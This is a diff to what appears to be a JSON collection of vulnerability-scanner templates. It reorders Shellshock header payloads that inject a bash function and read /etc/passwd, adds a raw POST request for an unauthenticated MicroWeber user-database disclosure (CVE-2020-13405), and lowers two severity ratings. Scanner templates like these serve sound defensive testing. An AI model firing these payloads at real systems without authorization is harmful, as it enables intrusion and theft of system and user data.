@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -10424,6 +10424,20 @@
       ]
     },
     {
+      "id": "CVE-2020-13405",
+      "info": {
+        "name": "MicroWeber - Unauthenticated User Database Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /module/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: {{BaseURL}}admin/view:modules/load_module:users\n\nmodule={{endpoint}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-13483",
       "info": {
         "name": "Bitrix24 through 20.0.0 allows XSS",
@@ -16681,7 +16695,7 @@
       "id": "CVE-2021-40149",
       "info": {
         "name": "Reolink E1 Zoom Camera <=3.0.0.716 - Private Key Disclosure",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -19666,7 +19680,7 @@
       "id": "CVE-2022-34049",
       "info": {
         "name": "Wavlink Exportlogs.sh - Configuration Exposure",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
